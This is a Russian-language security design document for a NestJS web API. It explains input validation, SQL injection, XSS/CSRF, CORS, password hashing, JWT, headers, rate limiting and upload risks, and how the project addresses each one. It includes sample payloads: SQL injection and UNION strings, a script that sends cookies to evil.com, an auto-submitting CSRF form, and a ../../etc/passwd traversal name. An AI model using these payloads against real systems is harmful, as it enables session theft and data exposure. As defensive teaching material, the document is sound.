## 2. Input Validation

### Как эксплуатируется недостаточная валидация
Если сервер верит форме/размеру/типу входных данных, через один и тот же эндпоинт можно протащить: SQL/NoSQL-инъекцию (см. §3), поля, которых быть не должно ("mass assignment" — например, добавить `"role": "admin"` в тело регистрации, если сервер слепо копирует все поля тела в сущность), огромные payload'ы, кладущие сервер (DoS через парсинг гигантского JSON), некорректные типы, ломающие бизнес-логику (строка вместо числа в поле "сумма").

### Общие способы защиты
- **Whitelist, не blacklist** — явно перечислять разрешённые поля/значения, а не пытаться перечислить всё запрещённое.
- Валидация **формы** (тип, длина, паттерн) отдельно от валидации **прав** (кто может прислать это поле) — это разные заботы на разных уровнях.
- Ограничение размера тела запроса на уровне HTTP-сервера, до парсинга.
- Явные DTO/схемы вместо "просто взять `req.body` как есть".

### В проекте
Глобальный `ValidationPipe` в [`main.ts`](../src/main.ts):
```ts
app.useGlobalPipes(
  new ValidationPipe({
    whitelist: true,            // лишние поля молча вырезаются...
    forbidNonWhitelisted: true, // ...а с этим флагом — вместо вырезания сразу 400
    transform: true,             // строки из query/body приводятся к типам DTO
    transformOptions: { exposeUnsetFields: false },
  }),
);
```
Это и есть защита от mass assignment: `RegisterDto` физически не содержит поля `role` — прислать его через `POST /auth/register` невозможно, `forbidNonWhitelisted` отклонит запрос ещё до контроллера. DTO с `class-validator` в каждом модуле — подробно в [`docs/auth-authorization.md`](auth-authorization.md), [`docs/user-profile.md`](user-profile.md).

## 3. SQL Injection

### Как работает атака
Классический пример уязвимого кода (не из этого проекта, иллюстрация):
```ts
// НИКОГДА так не делать
const query = `SELECT * FROM users WHERE email = '${email}'`;
```
Если `email` пришёл от пользователя как `' OR '1'='1`, итоговый запрос становится:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1'
```
`'1'='1'` всегда истинно — запрос вернёт вообще всех пользователей, хотя должен был проверять конкретный email. Более опасный вариант — **UNION-based injection**, когда через `' UNION SELECT password_hash, email FROM users --` можно вытащить данные из совершенно другой таблицы тем же запросом. Есть и **blind injection** — когда ответ сервера не показывает данные напрямую, но по разнице в поведении (задержка ответа, разные коды ошибок) можно восстанавливать данные по одному биту.

### Почему параметризация реально защищает
При параметризованном запросе (`WHERE email = $1`, значение передаётся отдельно) СУБД сначала **компилирует план запроса** с плейсхолдером, и только потом подставляет значение как данные — присланная строка физически не может стать частью SQL-синтаксиса, даже если в ней есть кавычки/точки с запятой. Это не "экранирование кавычек" (ненадёжный подход, который легко забыть в одном месте) — это структурное разделение кода запроса и данных на уровне протокола.

### В проекте
Ни одного случая ручной интерполяции SQL в коде приложения. Например, в [`UsersService.findMany`](../src/modules/users/users.service.ts):
```ts
where: { email: ILike(`%${params.q ?? ''}%`) },
```
Выглядит как конкатенация, но `ILike(...)` — оператор TypeORM: итоговое значение уходит как связанный параметр (`$1`), а не вклеивается в текст SQL. Миграции (`src/database/migrations/*.migration.ts`) используют `queryRunner.query()` с сырым SQL, но всегда со статичными строками, без пользовательского ввода.

## 4. XSS & CSRF

### XSS — как работает
Три вида: **Stored** (вредоносный скрипт сохраняется в БД — например, в комментарии — и выполняется у каждого, кто его просматривает), **Reflected** (скрипт приходит в самом запросе, например в query-параметре, и сервер отражает его обратно в HTML-ответе без экранирования), **DOM-based** (уязвимость целиком на клиенте, сервер вообще не участвует). Пример payload'а:
```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```
Если это попадает в HTML-страницу без экранирования — скрипт выполняется в браузере жертвы с её же правами (её куки, её сессия).

**Защита:** экранирование вывода (не позволять пользовательскому тексту стать HTML-разметкой), Content-Security-Policy (см. §9 — ограничивает, откуда вообще может грузиться/выполняться скрипт), `httpOnly` на чувствительных cookie (тогда даже успешный XSS не может прочитать их через `document.cookie`).

### CSRF — как работает
Пользователь залогинен на `bank.com` (у него в браузере валидная сессионная cookie). Он заходит на `evil.com`, где спрятана форма:
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>
```
Браузер **автоматически** приложит cookie `bank.com` к этому запросу (браузер не спрашивает "с какого сайта был инициирован запрос" при отправке cookie) — сервер увидит валидную сессию и выполнит перевод, хотя пользователь ничего не нажимал сам.

**Защита:** `SameSite` на cookie (браузер сам не прикладывает cookie к кросс-сайтовым запросам), CSRF-токен (случайное значение, которое сервер ожидает увидеть в теле/заголовке запроса — злоумышленник с чужого домена не может его узнать), проверка `Origin`/`Referer` заголовка.

### В проекте
**XSS** — по факту неприменимо в текущем виде: converter — чистый JSON API, нет серверного рендеринга HTML-шаблонов, значит нет места, куда пользовательский текст мог бы попасть как исполняемая разметка. Если в проекте появится отдача HTML — вопрос придётся пересмотреть.

**CSRF** — частично закрыт архитектурой из [`docs/auth-authorization.md`](auth-authorization.md#4-access--refresh--два-разных-токена-два-разных-секрета): refresh-токен — только в httpOnly-cookie с `sameSite: 'lax'` и узким `path: '/auth/refresh'`; access-токен едет в заголовке `Authorization`, который браузер не отправляет автоматически на кросс-сайтовые запросы (в отличие от cookie). Отдельного CSRF-токена нет — осознанный выбор, а не забытая мера, именно из-за bearer-токен дизайна основного API.

## 5. CORS

### Механика
Same-origin policy — дефолт браузера: JS-код с одного origin (схема+домен+порт) не может читать ответы от другого origin. CORS — механизм, которым **сервер** явно "включает обратно" конкретные разрешённые источники через заголовки ответа. Для "непростых" запросов (не GET/HEAD/POST с простым `Content-Type`, а, например, `PATCH` с `application/json` и кастомным заголовком `Authorization`) браузер сначала сам, без участия JS, посылает **preflight** — `OPTIONS`-запрос, спрашивающий "а можно ли вообще так делать?" — и только если сервер ответит "да" (`Access-Control-Allow-*` заголовки), браузер отправляет реальный запрос.

### Частые ошибки конфигурации
Отражать **любой** присланный `Origin` обратно в `Access-Control-Allow-Origin` без проверки по списку (эквивалентно "разрешено всем", но выглядит как будто есть проверка); `Access-Control-Allow-Origin: *` вместе с `Access-Control-Allow-Credentials: true` (браузер сам это запрещает, но старые/кастомные клиенты можно обмануть).

### В проекте
```ts
// src/main.ts
app.enableCors({
  origin: [
    'http://localhost:5174',
    'http://localhost:4200',
    'http://localhost:8080',
  ],
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
  credentials: true,
  preflightContinue: false,
  optionsSuccessStatus: 204,
});
```
Явный allowlist, не `'*'` — и не может им быть при `credentials: true`.

## 6. Password Security

### Почему нельзя просто SHA-256(password)
SHA-256/MD5 — быстрые хэш-функции, спроектированные для скорости (проверка контрольных сумм файлов и т.п.). На современном GPU можно перебрать миллиарды SHA-256-хэшей в секунду — при утечке базы с такими хэшами большинство паролей вскрывается брутфорсом за часы. Ещё одна проблема без соли — **rainbow tables**: заранее посчитанные таблицы "хэш → пароль" для популярных паролей, мгновенно раскрывающие одинаковые хэши у разных пользователей.

### Правильный подход
`bcrypt`/`scrypt`/`argon2` — **намеренно медленные** функции с настраиваемым cost-фактором (чем выше — тем на порядки дороже перебор) и обязательной **солью** (случайная строка, уникальная для каждого пароля, встроенная в сам хэш) — одинаковые пароли у разных пользователей дают разные хэши, rainbow tables бесполезны. Сравнение — через специальную функцию (`bcrypt.compare`), а не `===`, потому что она защищена от timing-атак (сравнение занимает одинаковое время независимо от того, на каком символе не совпало).

### В проекте
`bcrypt.hash(dto.password, SALT_ROUNDS=10)` / `bcrypt.compare` в [`AuthService`](../src/modules/auth/auth.service.ts) — подробный разбор "хэш ≠ шифрование" в [`docs/auth-authorization.md`](auth-authorization.md#2-пароль--хэш-а-не-шифрование). Правила формата: `@MinLength(8)`, `@MaxLength(72)` (72 — не случайное число, у bcrypt есть жёсткий лимит длины входа), обязательны буква и цифра.

## 7. Secure Secrets & Environment Variables

### Почему секреты не в коде
Коммит с секретом остаётся в истории git **навсегда**, даже после того, как его "удалили" следующим коммитом — историю нужно переписывать целиком (`git filter-repo` и т.п.), и то поздно, если репозиторий уже кто-то склонировал. Секреты, зашитые в код, попадают во все окружения одинаково (dev/staging/prod — один и тот же ключ) и в любой бэкап исходников.

### Общие практики
Переменные окружения — минимальный уровень; в проде — специализированные хранилища секретов (Vault, AWS/GCP Secrets Manager) с ротацией и аудитом доступа. Принцип наименьших привилегий — у каждого ключа/токена ровно те права, что нужны, не более. Разные секреты для разных окружений (dev-секрет никогда не совпадает с prod).

### В проекте
[`ConfigService`](../src/core/config/config.service.ts) + Joi-схема ([`config.validation.ts`](../src/core/config/config.validation.ts)) — обязательные/опциональные переменные валидируются при старте, приложение падает сразу при отсутствующем/невалидном значении. `.env` — в [`.gitignore`](../.gitignore), в репозитории только `.env.example` с плейсхолдерами. Специализированного secret-менеджера нет — ожидаемо для учебного/dev-проекта, но первое, что понадобилось бы при реальном деплое.

## 8. JWT Security

### Специфичные для JWT атаки
**Alg confusion** — JWT сам содержит в заголовке, каким алгоритмом он подписан (`HS256`, `RS256`, или даже `none`). Если сервер слепо доверяет этому полю и пытается проверить подпись "тем алгоритмом, что указан в токене", злоумышленник может прислать токен с `alg: none` (без подписи вообды) или, зная публичный RSA-ключ сервера (публичные ключи для RS256 часто публичны по определению), подписать токен по HS256, используя этот публичный ключ как секрет — если сервер не зафиксировал жёстко ожидаемый алгоритм, проверка пройдёт. **Хранение на клиенте** — токен в `localStorage` доступен любому XSS-скрипту на странице; токен в cookie без `httpOnly` — тоже.

### Общие практики
Всегда явно указывать/фиксировать ожидаемый алгоритм на стороне сервера при проверке, не брать его из самого токена. Короткий TTL у access-токена (компрометация даёт ограниченное окно). Не класть в payload ничего чувствительного — JWT **подписан**, но не зашифрован, любой может декодировать payload на [jwt.io](https://jwt.io/introduction) и прочитать содержимое.

### В проекте
Целиком разобрано в [`docs/auth-authorization.md`](auth-authorization.md#4-access--refresh--два-разных-токена-два-разных-секрета): `@nestjs/jwt` сам фиксирует алгоритм при `signAsync`/`verifyAsync` (HS256 по умолчанию, не берётся из заголовка присланного токена), разные секреты access/refresh, в payload только `sub` — не роли (роли перечитываются из БД на каждый запрос через `usersService.findById`, а не доверяются токену). Refresh — только в httpOnly-cookie. Задокументированный сознательный пробел: нет отзыва токена/blacklist до истечения `exp`, нет детекции повторного использования украденного refresh-токена.

## 9. HTTP Security Headers

### Что за заголовки и от чего каждый защищает

| Заголовок | От чего защищает | Как работает |
|---|---|---|
| **Content-Security-Policy (CSP)** | XSS, инъекция стороннего контента | Явно перечисляет, из каких источников можно грузить/выполнять скрипты, стили, картинки и т.д. — даже если XSS-скрипт как-то попал на страницу, браузер откажется его выполнить, если источник не в списке |
| **Strict-Transport-Security (HSTS)** | Man-in-the-middle через downgrade на HTTP | Говорит браузеру: в течение N секунд общаться с этим доменом **только** по HTTPS, даже если пользователь наберёт `http://` вручную или перейдёт по старой ссылке |
| **X-Frame-Options** | Кликджекинг | Запрещает встраивать страницу в `<iframe>` на чужом сайте — без этого злоумышленник может наложить невидимый iframe с вашим сайтом поверх своей страницы и обманом заставить пользователя кликнуть настоящую кнопку (например, "перевести деньги"), думая, что кликает что-то другое |
| **X-Content-Type-Options: nosniff** | MIME-sniffing | Запрещает браузеру самому "угадывать" тип содержимого по байтам, игнорируя `Content-Type` — без этого файл, загруженный как "картинка", браузер может попытаться выполнить как HTML/JS, если внутри похожая разметка |
| **Referrer-Policy** | Утечка данных через URL в заголовке Referer | Ограничивает, сколько информации об исходной странице (полный URL с query-параметрами вплоть до токенов в URL) уходит на сторонние домены при переходе по ссылке |
| **Permissions-Policy** | Несанкционированное использование возможностей браузера | Явно запрещает/разрешает использование камеры, геолокации, микрофона и т.п. для этой страницы и встроенных iframe |

### В проекте — реальный пробел
Нигде не подключён `helmet`/`@fastify/helmet` — ни в зависимостях `package.json`, ни в `main.ts`. Значит ни один из заголовков выше не выставляется — только то, что Fastify отдаёт по умолчанию без единой настройки поверх. Как это выглядело бы, если подключить (чертёж, не реализовано):
```ts
import helmet from '@fastify/helmet';
// ...
await app.register(helmet);
```
Один вызов регистрирует разумные дефолты сразу под большинство заголовков из таблицы выше.

## 10. Rate Limiting

### Зачем и как устроено технически
Защита от DoS (одна цель захлёбывается запросами) и от автоматизированного перебора (см. §11). Типичные алгоритмы: **fixed window** (просто считать запросы в фиксированном промежутке — простое, но с "всплеском" на границе окна), **sliding window** (более точный, без всплеска на границе), **token bucket** (запросы тратят "токены" из ведра, которое пополняется с постоянной скоростью — позволяет короткие всплески, но ограничивает средний темп).

### В проекте
Два слоя:
```ts
// src/core/throttler/throttler.module.ts — глобальный "пол" на всё приложение
useFactory: (config: ConfigService) => {
  const ttl = Number(config.get('THROTTLE_GLOBAL_TTL'));
  const limit = Number(config.get('THROTTLE_GLOBAL_LIMIT'));
  return [{ ttl, limit }];
},
```
Плюс точечные `@Throttle(...)` поверх этого глобального лимита на более чувствительных/дорогих роутах (логин — 5/мин, OTP-подтверждение, `file-transform` — разные лимиты по стоимости операции).

**Известное ограничение именно этой реализации:** `@nestjs/throttler` по умолчанию считает запросы **в памяти процесса**. Если приложение когда-нибудь будет запущено в нескольких инстансах за балансировщиком нагрузки, у каждого инстанса будет свой независимый счётчик — реальный лимит на пользователя фактически умножится на число инстансов. Для единого счётчика на несколько инстансов нужно внешнее хранилище (обычно Redis) — сейчас в проекте это не требуется (один инстанс), но это первое, что сломается при горизонтальном масштабировании без изменений.

## 11. Brute-Force Protection

### Разница между rate limiting и защитой от брутфорса аккаунта
**Rate limiting** ограничивает *частоту запросов вообще* — не более N запросов в минуту на этот роут, независимо от того, кто и против какого аккаунта стучится. **Брутфорс-защита аккаунта** — это *попытки против одной конкретной учётной записи*: счётчик неудачных попыток входа именно для этого email, с блокировкой (временной или до подтверждения по почте/капче) после N неудач. Это разные оси: throttler остановит "миллион запросов в секунду с одного IP", но не остановит медленный (1 попытка в 20 секунд, чтобы не задеть rate limit) перебор пароля для одного конкретного аккаунта.

Отдельный нюанс: **credential stuffing** — не перебор паролей для одного аккаунта, а проверка одной и той же уже слитой в других утечках пары email/пароль сразу против множества сервисов — от этого не спасает ни rate limiting, ни account lockout, нужна отдельная защита (проверка по базам утечек при регистрации/логине, 2FA).

Риск чрезмерного account lockout: если блокировать аккаунт наглухо после N неудачных попыток, это превращается в удобный DoS для злоумышленника — специально ввести неверный пароль N раз для чужого аккаунта и заблокировать легитимного пользователя.

### В проекте
Throttle на логин (5/мин) + `attemptsCount`/`OTP_MAX_ATTEMPTS` на OTP-код + resend-cooldown через `lastSentAt` в сущности `LoginAttempt`. Сознательное решение, зафиксированное в `.omc/plans/auth-login-otp-plan.md`: отдельного механизма блокировки аккаунта сверх throttler'а нет — явный выбор простоты, с учётом описанного выше риска "DoS через чужой lockout" как одной из причин не спешить его добавлять без явной необходимости.

## 12. File Upload Security

### Специфичные для загрузки файлов атаки
**Path traversal** — имя файла от клиента типа `../../etc/passwd` используется напрямую как часть пути сохранения. **Загрузка исполняемого кода** — если папка с загруженными файлами доступна по HTTP и сервер их выполняет по расширению (например, `.php` на PHP-сервере), загрузка "картинки", которая на самом деле скрипт — прямой путь к Remote Code Execution. **Zip/decompression bomb** — крошечный по размеру архив/картинка, разворачивающийся в гигабайты при распаковке/декодировании, кладёт сервер по памяти. **XXE** — отдельно разобрано в [`docs/file-processing.md`](file-processing.md#8-secure-file-processing).

### Общие способы защиты
Никогда не использовать имя файла от клиента как путь на диске — генерировать своё (uuid); проверка содержимого по magic bytes, не по расширению/`Content-Type`; лимиты размера на каждом уровне (HTTP-сервер, приложение); хранить загруженные файлы вне папки, из которой сервер отдаёт статику как есть; отдельное антивирусное сканирование для по-настоящему открытой публичной загрузки (production-уровень, не всегда нужен для внутренних инструментов).

### В проекте
Всё реализовано в [`file-transform`](../src/modules/file-transform) (подробнее — [`docs/file-processing.md`](file-processing.md)):
- Определение формата по расширению, не по заявленному `Content-Type` (`detectFormatByExtension`).
- Лимиты размера на каждый формат отдельно (`assertSizeAllowed` → `PayloadTooLargeException`).
- XXE-безопасная библиотека для XML — проверено вживую: XML с `<!DOCTYPE><!ENTITY>` даёт `400`, файл сервера не читается.
- Имя файла на диске — UUID истории операции, не имя от клиента (`ResultStorageService`) — path traversal невозможен по конструкции, не отдельной проверкой.
- Эндпоинт целиком под RBAC.

Пробел: нет проверки по magic bytes — доверяем только расширению имени файла. Согласуется с решением "максимально просто" для этой фичи, но первое, что стоило бы усилить при реальной нагрузке.
